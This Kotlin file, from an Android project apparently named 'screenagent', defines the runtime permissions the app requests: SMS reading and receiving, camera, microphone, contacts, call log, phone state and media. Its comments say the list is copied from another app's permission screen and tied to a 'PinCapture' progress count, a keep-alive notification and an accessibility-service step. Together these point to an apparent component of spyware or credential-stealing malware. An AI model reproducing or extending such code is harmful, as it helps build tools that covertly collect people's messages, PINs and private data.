package com.zaka.screenagent.perm

import android.Manifest
import android.os.Build

/**
 * 2.2 的 9 项运行时权限（对应 PinCapture 的 granted*100/9）。
 * 来源：com.lite.cloudfinder.activity.PermissionActivity 的请求数组，按 API 33 取 9 项。
 */
object PermissionFlow {

    val PERMISSIONS: Array<String> = if (Build.VERSION.SDK_INT >= 33) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            // Android 13+ 通知权限：前台服务/保活通知没有它就不显示（系统仍允许 FGS 运行）
            Manifest.permission.POST_NOTIFICATIONS
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }

    /**
     * 厂商可覆盖的申请清单（null = 用默认 9 项）。
     * 摩托罗拉实测只需要短信相关的 4 项；摄像头/麦克风/媒体这些不再申请，
     * 否则打开无障碍时会弹一堆无关权限框（用户反馈过）。
     */
    @Volatile
    var overrideList: Array<String>? = null

    fun effective(): Array<String> = overrideList ?: PERMISSIONS

    /** 当前生效清单里的总数（进度用） */
    fun total(): Int = effective().size

    const val TOTAL = 9

    /** 进度公式照 2.2：granted * 100 / 9 */
    fun progressOf(granted: Int): Int = (granted * 100) / TOTAL
}
